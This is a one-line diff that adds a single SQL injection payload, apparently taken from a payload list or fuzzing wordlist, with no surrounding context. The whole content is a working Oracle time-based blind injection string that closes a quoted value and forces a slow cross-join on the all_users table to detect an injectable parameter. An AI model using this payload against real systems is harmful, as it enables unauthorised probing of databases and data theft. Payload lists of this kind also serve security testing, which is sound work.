@@ -1,0 +1,1 @@
+1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
